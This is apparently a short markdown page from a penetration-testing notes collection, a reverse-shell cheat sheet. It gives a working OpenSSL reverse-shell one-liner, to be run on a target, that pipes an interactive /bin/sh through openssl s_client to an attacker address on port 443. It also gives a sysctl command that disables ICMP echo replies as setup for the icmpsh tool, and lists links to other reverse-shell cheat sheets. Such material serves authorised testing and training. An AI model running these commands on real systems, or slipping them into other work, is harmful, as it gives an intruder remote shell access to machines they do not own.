# OpenSSL Reverse Shell
[Generate OpenSSL Certificate](../../SSL/OpenSSL/README.md#Generate-SSL-Certificate)
[Start OpenSSL Listener](../../SSL/OpenSSL/README.md#Start-OpenSSL-Listener)
##### From Target, create named pipe and OpenSSL client to connect to Attack Machine.
```bash
# On Target
mkfifo /tmp/x; /bin/sh -i < /tmp/x 2>&1 | openssl s_client -quiet -connect <Attack IP ADdress>:443 > /tmp/x; rm /tmp/x
```

# ICMP Reverse Shell with icmpsh
##### Disable ICMP replies by the OS
```bash
sysctl -w net.ipv4.icmp_echo_ignore_all=1
```
## ICMP Reverse Shell References
[Github icmpsh](https://github.com/bdamele/icmpsh)

[Pentestlab Blog](https://pentestlab.blog/tag/icmpsh/)

[Security Online](https://securityonline.info/icmpsh-simple-reverse-icmp-shell/)

# References
[HighOn.Coffee](https://highon.coffee/blog/reverse-shell-cheat-sheet/)

[PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)

[Pentestmonkey](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)

[Staged vs Stageless Handlers](https://buffered.io/posts/staged-vs-stageless-handlers/)